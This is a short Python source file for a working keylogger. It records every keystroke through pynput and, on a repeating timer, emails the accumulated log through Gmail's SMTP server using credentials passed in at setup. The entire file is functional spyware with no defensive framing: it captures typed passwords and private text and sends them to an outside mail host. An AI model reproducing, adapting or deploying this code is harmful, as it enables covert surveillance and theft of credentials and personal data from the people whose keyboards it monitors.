#!/usr/bin/env python
import pynput.keyboard, threading, smtplib


class KeyLogger:
    def __init__(self, time_interval=60, email='', password=''):
        self.log = "KeyLogger Started"
        self.interval = time_interval
        self.email = email
        self.password = password
        # self.start()

    def append_to_log(self, string):
        self.log = self.log + string

    def key_pressed(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        print(self.log)
        self.send_mail(self.email, self.password, "\n\n"+self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        # creating smtp server
        server = smtplib.SMTP("smtp.gmail.com", 587)
        # tls connection
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.key_pressed)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
